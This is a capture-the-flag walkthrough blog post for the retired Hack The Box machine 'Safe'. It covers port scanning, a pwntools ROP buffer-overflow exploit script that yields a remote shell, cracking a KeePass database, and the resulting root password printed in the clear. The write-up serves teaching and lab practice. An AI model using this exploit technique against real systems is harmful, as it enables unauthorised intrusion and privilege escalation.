---
layout: post
title: "Safe: Hack The Box Walkthrough"
date: 2019-10-26 15:57:20 +0000
last_modified_at: 2019-10-26 15:57:20 +0000
category: Walkthrough
tags: ["Hack The Box", Safe, retired]
comments: true
image:
  feature: safe-htb-walkthrough.jpg
  credit: AbsolutVision / Pixabay
  creditlink: https://pixabay.com/illustrations/password-app-application-business-2781614/
---

This post documents the complete walkthrough of Safe, a retired vulnerable [VM][1] created by [ecdo][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Safe is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.147 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-07-28 11:21:20 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.147                                    
Discovered open port 1337/tcp on 10.10.10.147                                  
Discovered open port 22/tcp on 10.10.10.147
```

Hmm. `masscan` finds three open ports. `1337/tcp` sure looks interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,1337 -A --reason -oN nmap.txt 10.10.10.147
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?  syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     05:26:35 up 1:47, 1 user, load average: 0.13, 0.04, 0.01
|   DNSVersionBindReqTCP:
|     05:26:30 up 1:47, 1 user, load average: 0.14, 0.04, 0.01
|   GenericLines:
|     05:26:17 up 1:47, 1 user, load average: 0.07, 0.03, 0.01
|     What do you want me to echo back?
|   GetRequest:
|     05:26:23 up 1:47, 1 user, load average: 0.07, 0.03, 0.01
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions:
|     05:26:24 up 1:47, 1 user, load average: 0.06, 0.03, 0.01
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help:
|     05:26:41 up 1:47, 1 user, load average: 0.12, 0.04, 0.01
|     What do you want me to echo back? HELP
|   Kerberos, TLSSessionReq:
|     05:26:42 up 1:47, 1 user, load average: 0.12, 0.04, 0.01
|     What do you want me to echo back?
|   NULL:
|     05:26:17 up 1:47, 1 user, load average: 0.07, 0.03, 0.01
|   RPCCheck:
|     05:26:25 up 1:47, 1 user, load average: 0.06, 0.03, 0.01
|   RTSPRequest:
|     05:26:24 up 1:47, 1 user, load average: 0.06, 0.03, 0.01
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq:
|     05:26:41 up 1:47, 1 user, load average: 0.12, 0.04, 0.01
|_    What do you want me to echo back?
```

`1337/tcp` sure looks like some kind of `echo` service. Well, I'm going to check out the `http` service first. And, this is how it looks like.


{% include image.html image_alt="85b8c013.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/85b8c013.png" %}


Nothing really exciting with the default Apache page or is that so? Check out the HTML source.


{% include image.html image_alt="1ee133e1.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/1ee133e1.png" %}


I smell remote code execution (RCE) in `myapp`.

### Vulnerability Anlysis of `myapp`

`myapp` is indeed at `http://10.10.10.147/myapp`.

```
# wget http://10.10.10.147/myapp
# file myapp
myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
```

Looks like someone has submitted the file to VirusTotal for a quick look.


{% include image.html image_alt="621e2876.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/621e2876.png" %}


On top of that, someone has also submitted to `ropshell.com` for ROP gadgets.


{% include image.html image_alt="ead45588.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/ead45588.png" %}


A quick `checksec` in PEDA shows that NX is enabled (non-executable stack).


{% include image.html image_alt="2c2d224a.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/2c2d224a.png" %}


If I have to guess, I would say this is a simple ROP exploit. Don't take my word for it. Look at the `main()` function of `myapp`.


{% include image.html image_alt="87b73f8e.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/87b73f8e.png" %}


### Exploit Development

Long story short, the offset to control the return address is 120 bytes. Here's how to do it.

1. Get PEDA if you have not already done so.
2. Generate a 200-byte pattern. `gdb-peda# pattern_create 200 buf`.
3. `set follow-fork-mode parent` because of `system()` forks.
4. Break at `*main+77`. This is the last instruction before RIP pops the return address.
5. `run` with the pattern or `r < buf`.
6. `continue` or `c` with the execution.

You should see something like this.


{% include image.html image_alt="88110186.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/88110186.png" %}


Use `pattern_offset` to determine the offset.


{% include image.html image_alt="a165b5d3.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/a165b5d3.png" %}


Armed with that knowledge, you can write a ROP exploit with `pwntools` like so.

<div class="filename"><span>exploit.py</span></div>

~~~~python
from pwn import *

context(terminal=["tmux", "new-windows"])
context(os="linux", arch="amd64")

myapp = ELF("./myapp")
p     = remote("10.10.10.147", 1337)

bss = myapp.bss()
junk = 'A' * 120

# Show me the shell
rop = ROP(myapp)
rop.gets(bss)
rop.system(bss)

payload = junk + str(rop) + "/bin/bash\n" + "bash\n"

p.send(payload)
p.interactive()
~~~~

I've chosen to write the string "/bin/bash" at `.bss` because its address doesn't change.

## Low-Privilege Shell

Let's give it a go.


{% include image.html image_alt="8b20e99a.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/8b20e99a.png" %}


Sweet. The `user.txt` is at `user`'s home directory.


{% include image.html image_alt="c26b1848.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/c26b1848.png" %}


## Privilege Escalation

During enumeration of `user`'s account, I noticed the presence of a KeePass database and five image files in the home directory as well.


{% include image.html image_alt="8924871a.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/8924871a.png" %}


This feels strangely familiar to BigHead. Well, in any case, let's grab these files to my attacking machine but note that there's no `nc` in this machine. We'll just have to transfer our `nc` over.


{% include image.html image_alt="f2aa8982.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/f2aa8982.png" %}


We can transfer the files now. And just like BigHead, one of the image files is the key file. We just need to crack the master password.


{% include image.html image_alt="8a33e563.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/8a33e563.png" %}


The master password is `bullshit`. Yeah.

...

Armed with the master password and the key file, we can open the KeePass database.


{% include image.html image_alt="b39109ff.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/b39109ff.png" %}


Simply copy the `root` password to the clipboard and we are done.


{% include image.html image_alt="0586e79e.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/0586e79e.png" %}


The `root` password is `u3v2249dl9ptv465cogl3cnpo3fyhk`.


{% include image.html image_alt="56f40503.png" image_src="/4ad507a3-53ed-486c-8b1a-691ce59ddc6b/56f40503.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/199
[2]: https://www.hackthebox.eu/home/users/profile/91108
[3]: https://www.hackthebox.eu/
